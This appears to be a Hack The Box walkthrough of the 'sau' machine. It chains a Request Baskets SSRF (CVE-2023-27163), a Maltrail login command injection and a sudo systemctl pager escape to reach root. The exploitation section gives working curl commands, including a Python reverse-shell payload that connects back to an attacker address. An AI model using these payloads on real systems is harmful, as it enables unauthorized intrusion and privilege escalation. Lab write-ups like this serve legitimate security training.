# sau — Hack The Box Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/HTB-sau-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
</p>

## Machine Information

- **Machine:** sau
- **Platform:** Hack The Box
- **IP:** 10.129.229.26

---

# Table of Contents

- [sau — Hack The Box Walkthrough](#sau--hack-the-box-walkthrough)
  - [Machine Information](#machine-information)
- [Table of Contents](#table-of-contents)
- [TL;DR](#tldr)
- [Reconnaissance](#reconnaissance)
- [Enumeration \& Exploitation](#enumeration--exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [References](#references)
- [Conclusion](#conclusion)

---

# TL;DR

- The exposed surface is SSH on 22/tcp and Request Baskets v1.2.1 on 55555/tcp; Maltrail's web interface on 80/tcp is filtered and unreachable directly.
- CVE-2023-27163 in Request Baskets enables SSRF: a forwarding basket pointed at `127.0.0.1:80` tunnels traffic to the internal Maltrail instance.
- Maltrail 0.53's `/login` endpoint injects shell commands through the `username` parameter, producing a reverse shell as user `puma`.
- User flag at `/home/puma/user.txt`: `REDACTED`.
- `sudo /usr/bin/systemctl status trail.service` opens the `less` pager, which can be escaped with `!sh` to obtain a root shell.
- Root flag at `/root/root.txt`: `REDACTED`.

---

# Reconnaissance

The port scan of the active instance (10.129.229.26) returned three actionable results:

- **22/tcp** — OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
- **55555/tcp** — Golang `net/http` server, identified as Request Baskets v1.2.1
- **80/tcp** — Maltrail (filtered)
- **8338/tcp** — filtered

**Reasoning.** Two web services were detected, but only one was directly reachable. Maltrail, the malicious-traffic logging tool whose web interface runs on port 80, was filtered, so it could not be targeted straight away. Request Baskets on 55555, however, was fully exposed and is a forwarding/proxy service — exactly the kind of component that can be abused for Server-Side Request Forgery. Because Request Baskets v1.2.1 is affected by CVE-2023-27163 (SSRF), it became the natural pivot: instead of attacking Maltrail from the outside, we would ask Request Baskets to fetch Maltrail for us from inside the host.

---

# Enumeration & Exploitation

**Step 1 — Reaching Maltrail through SSRF (CVE-2023-27163).**

Request Baskets exposes an API to create "baskets" that forward requests to an arbitrary URL. By creating a basket whose `forward_url` points to `http://127.0.0.1:80`, with `proxy_response` enabled so the upstream response is sent back to us, the internal Maltrail interface becomes reachable through the Request Baskets port:

```bash
curl -X POST http://10.129.229.26:55555/api/baskets/exploit \
  -H "Content-Type: application/json" \
  -d '{"forward_url": "http://127.0.0.1:80", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
```

Maltrail is then accessible at `http://10.129.229.26:55555/exploit/`.

**Why this works.** The basket acts as a server-side proxy: Request Baskets makes the request to `127.0.0.1:80` from the host itself, bypassing the network filter that blocks direct access to port 80.

**Step 2 — Code execution on Maltrail (RCE).**

Maltrail version 0.53's `/login` endpoint does not properly sanitize the `username` parameter, allowing shell command injection. With a listener waiting on our machine:

```bash
nc -lvp 4444
```

we trigger the injection through the proxied Maltrail endpoint:

```bash
curl 'http://10.129.229.26:55555/exploit/login' \
  --data 'username=admin;`python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.75\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")"`'
```

The command opens a reverse shell back to port 4444.

**Step 3 — Stabilizing the shell.**

The initial shell is non-interactive. We upgrade it with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

then background it (`Ctrl+Z`), restore terminal settings, and bring it back:

```bash
stty raw -echo; fg
export TERM=xterm
```

This gives a usable interactive shell as `puma` on the target.

**Step 4 — User flag.**

The `puma` user owns a flag file in their home directory:

```bash
cat /home/puma/user.txt
```

**user.txt**: `REDACTED`.

---

# Privilege Escalation

**Reasoning.** Having a shell as `puma`, the next question is what that user can run with elevated privileges. The sudo configuration allows `puma` to run `/usr/bin/systemctl` without a password. Systemd's `systemctl status` invokes a pager — on this system, `less`. The systemd version in use (245) does not set `LESSSECURE=1`, which means `less` remains capable of spawning a subshell even when launched from a privileged context.

**Escalation path:**

```bash
sudo /usr/bin/systemctl status trail.service
```

While inside the `less` pager, pressing `!` followed by `sh` escapes the pager and spawns a shell:

```
!sh
```

Because `systemctl` was run via `sudo`, the resulting shell runs as root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

The root flag is then read directly:

```bash
cat /root/root.txt
```

**root.txt**: `REDACTED`.

---

# Flags

- **user.txt**: `REDACTED`
- **root.txt**: `REDACTED`

---

# Lessons Learned

- A forwarding or proxy service exposed on the network is an attractive SSRF vector: it can reach services that are filtered from the outside, such as an internal management interface.
- Login endpoints are not exempt from injection flaws; any parameter reflected into a shell command (here `username`) can lead to remote code execution.
- Running `systemctl status` through `sudo` is dangerous when the pager (`less`) is not hardened: with `LESSSECURE` unset, `!sh` breaks out of the pager with the privileges of the `sudo` command.
- Defense in depth would restrict basket forward targets (e.g. disallow `127.0.0.1`/private ranges), sanitize or avoid shell interpolation in authentication endpoints, and restrict pager escape via `LESSSECURE=1` or tighter sudo rules.

---

# References

- [CVE-2023-27163 — Request Baskets SSRF](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
- [CVE-2023-26604 — systemd `systemctl` pager escape](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)

---

# Conclusion

The `sau` machine is compromised by chaining two web vulnerabilities followed by a sudo pager escape. Request Baskets v1.2.1, reachable on port 55555, is abused via its SSRF flaw (CVE-2023-27163) to create a forwarding basket that tunnels to Maltrail on the filtered internal port 80. Maltrail 0.53's `/login` endpoint then accepts a shell-injected `username`, delivering a reverse shell as `puma` and the user flag. Finally, passwordless `sudo` access to `systemctl status trail.service` opens `less`, whose unsecured pager (`LESSSECURE` unset on systemd 245) is escaped with `!sh` to obtain root and the root flag. The case illustrates how a chain of individually reachable misconfigurations — SSRF, command injection, and an unrestricted pager — moves from unauthenticated network access to full root compromise.